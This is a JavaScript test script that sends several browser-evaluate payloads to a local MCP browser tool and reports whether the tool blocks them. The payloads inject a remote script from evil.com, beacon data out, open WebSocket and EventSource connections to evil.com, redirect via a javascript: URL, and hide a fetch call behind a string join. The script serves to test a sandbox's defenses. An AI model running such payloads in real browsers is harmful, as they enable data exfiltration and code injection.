import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";

const t = new StdioClientTransport({
  command: "node",
  args: ["/Users/tongwu/Projects/novada-mcp/build/index.js"],
  env: Object.assign({}, process.env, { NOVADA_API_KEY: "dummy" }),
});
const c = new Client({ name: "qa", version: "0" }, { capabilities: {} });
await c.connect(t);

const tests = [
  // DOM manipulation that could create script elements
  { name: "create_script_with_src", script: "var s=document.createElement('script');s.src='https://evil.com/x.js';document.head.appendChild(s)" },
  // navigator.sendBeacon 
  { name: "sendBeacon", script: "navigator.sendBeacon('https://evil.com', 'data')" },
  // location.href for navigation
  { name: "location_href", script: "location.href='https://evil.com'" },
  // location.assign
  { name: "location_assign", script: "location.assign('javascript:alert(1)')" },
  // WebSocket direct
  { name: "websocket_direct", script: "new WebSocket('wss://evil.com')" },
  // EventSource  
  { name: "eventsource_direct", script: "new EventSource('https://evil.com')" },
  // Indirect fetch via dynamically built string
  { name: "indirect_dynamic_string", script: "window[['fe','tch'].join('')]('evil.com')" },
];

for (const test of tests) {
  try {
    const r = await c.callTool({ name: "novada_browser", arguments: {
      actions: [{ action: "evaluate", script: test.script }]
    }});
    const text = r.content?.[0]?.text ?? JSON.stringify(r);
    const blocked = r.isError || text.includes('BLOCKED') || text.includes('Invalid parameters');
    console.log(`[${blocked ? 'BLOCKED' : 'PASSED'}] ${test.name}`);
    if (!blocked) {
      console.log(`  -> ${text.slice(0, 150)}`);
    }
  } catch(e) {
    console.log(`[THREW] ${test.name}: ${e.message?.slice(0, 100)}`);
  }
}

await c.close();
